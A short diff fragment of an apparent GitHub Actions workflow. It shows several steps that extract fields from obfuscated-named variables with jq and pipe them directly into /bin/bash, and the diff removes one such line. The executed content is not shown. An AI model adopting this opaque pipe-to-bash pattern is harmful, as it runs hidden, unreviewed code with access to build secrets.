@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
           printf '%s' "$dw276" | jq -r .te725 | /bin/bash
           echo $rqv45683 | jq -r .aw2166 | /bin/bash
-          printf '%s' "$t89917" | jq -r .f86 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
